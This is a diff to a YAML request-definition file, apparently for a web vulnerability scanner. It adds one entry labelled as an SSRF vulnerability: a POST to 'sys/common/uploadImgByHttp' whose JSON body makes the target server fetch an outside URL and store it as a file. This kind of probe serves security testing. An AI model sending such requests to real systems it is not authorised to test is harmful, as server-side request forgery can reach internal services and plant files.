@@ -177,4 +177,11 @@ requests:
     Content-Type: ""
     User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0"
     Body: ""
+  # uploadImgByHttp SSRF 漏洞
+  uploadImgByHttp:
+    URL: "sys/common/uploadImgByHttp"
+    Method: "POST"
+    Content-Type: "application/json"
+    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0"
+    Body: "{\"fileUrl\":\"http://www.baidu.com/\",\"filename\":\"temp.txt\",\"bizPath\":\"temp_files\"}"
   
